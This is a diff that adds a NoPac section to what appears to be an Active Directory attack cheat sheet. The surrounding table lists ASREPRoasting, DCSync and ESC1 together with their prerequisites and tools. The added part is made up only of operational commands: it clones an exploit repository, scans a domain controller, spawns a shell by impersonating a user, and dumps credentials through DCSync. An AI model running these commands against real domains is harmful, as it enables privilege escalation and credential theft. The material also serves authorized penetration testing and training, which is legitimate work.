@@ -7,3 +7,14 @@
 | ***ASREPRoasting***          | No kerberos preauth, crackable password                                                            | Rubeus/Impacket-GetNPUsers    |
 | ***DCSync***                 | Replicating Directory Changes, Replicating Directory Changes All                                   | Mimikatz/Impacket-secretsdump |
 | ***ESC1***                   | Domain creds, active AD CS, published template with "Enroll" rights, template allows client auth   |                               |
+#### NoPac
+```
+git clone https://github.com/Ridter/noPac.git
+sudo python3 scanner.py <DOMAIN>/<USER>:<PASS> -dc-ip <IP> -use-ldap
+
+#Shell
+sudo python3 noPac.py <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP>  -dc-host <DC_HOSTNAME> -shell --impersonate <USER> -use-ldap
+
+#DCSync
+sudo python3 noPac.py <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP>  -dc-host <DC_HOSTNAME> --impersonate <USER> -use-ldap -dump -just-dc-user <DOMAIN>/<USER>
+```
